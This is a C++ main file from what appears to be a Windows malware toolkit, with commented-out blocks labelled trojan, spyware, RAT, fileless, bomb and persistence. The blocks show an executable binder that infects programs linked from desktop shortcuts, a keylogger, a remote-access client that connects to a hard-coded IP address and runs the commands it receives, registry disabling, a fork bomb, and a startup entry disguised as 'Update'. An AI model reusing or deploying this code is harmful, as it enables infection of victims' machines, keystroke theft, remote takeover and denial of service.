#include "Reality.hpp"

#include <iostream>
#include <thread>

int	main(int argc, char** argv) {
	// Virus -> Trojan
	/*EXEBinder exeBinder;
	if(exeBinder.AmIBinded(argv[0])) {
		exeBinder.Open(argv[0]);

		return EXIT_SUCCESS;
	}

	std::vector<std::string> files;
	Miscellaneous().GetAllShortcutsTargetFromDesktop(files);
	std::for_each(files.begin(), files.end(), [&exeBinder, argv] (std::string& file) {
		std::vector<std::string> files { file };
		exeBinder.Bind(files, file, argv[0]);
	});*/



	// Spyware
	/*std::thread threadKeylogger([] {
		std::function<void(PKBDLLHOOKSTRUCT)> klCallback = [] (PKBDLLHOOKSTRUCT key) {
			std::cout << Keylogger::vkCodesAll[key->vkCode] << " ";
		};
		Keylogger kl(klCallback);

		while(kl.Update());
	});
	threadKeylogger.detach();*/



	// RAT (Remote Access Trojan / rootkit)
	/*std::thread threadRAT([] {
		BClient bClient(DefaultSocketConfigurations::TCP, 32406, "162.55.32.18");
		bClient.Connect();
		bClient.ReceiveData();
		bClient.SendData("None");

		std::string command;
		while(!(command = bClient.ReceiveData()).empty()) {
			bClient.SendData(Miscellaneous::System(command));
		}
	});
	threadRAT.detach();*/



	// Fileless
	/*Registry registry;
	registry.DisableAll(true);*/



	// Logic, Fork, Null bomb
	/*Bomb bomb;
	bomb.DeployFork();*/



	// Miscellaneous
	/*Miscellaneous::AddMeToStartup("Update", argv[0]);*/



	while(true) {
		Sleep(1);
	}

	return EXIT_SUCCESS;
}

/*
	https://docs.microsoft.com/en-us/windows/win32/taskschd/boot-trigger-example--c---
*/